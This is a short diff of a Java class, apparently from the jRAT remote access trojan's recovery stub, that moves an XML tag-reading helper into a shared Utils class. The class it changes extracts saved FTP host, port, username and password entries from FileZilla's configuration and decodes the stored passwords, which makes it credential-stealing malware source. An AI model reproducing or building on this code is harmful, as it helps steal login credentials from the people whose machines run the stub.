@@ -7,6 +7,8 @@ import java.util.List;
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 
+import jrat.plugin.recovery.stub.Utils;
+
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
@@ -41,10 +43,10 @@ public class FileZilla extends AbstractRecoverer {
 				if (n.getNodeType() == Node.ELEMENT_NODE) {
 					Element e = (Element) n;
 
-					String host = getTagValue("Host", e);
-					String port = getTagValue("Port", e);
-					String username = getTagValue("User", e);
-					String password = getTagValue("Pass", e);
+					String host = Utils.getTagValue("Host", e);
+					String port = Utils.getTagValue("Port", e);
+					String username = Utils.getTagValue("User", e);
+					String password = Utils.getTagValue("Pass", e);
 					
 					try {
 						password = new String(new BASE64Decoder().decodeBuffer(password));
@@ -60,12 +62,6 @@ public class FileZilla extends AbstractRecoverer {
 		return list;
 	}
 
-	private static String getTagValue(String tag, Element e) {
-		NodeList list = e.getElementsByTagName(tag).item(0).getChildNodes();
-		Node node = (Node) list.item(0);
-		return node == null ? "" : node.getNodeValue();
-	}
-	
 	@Override
 	public String getName() {
 		return "FileZilla";
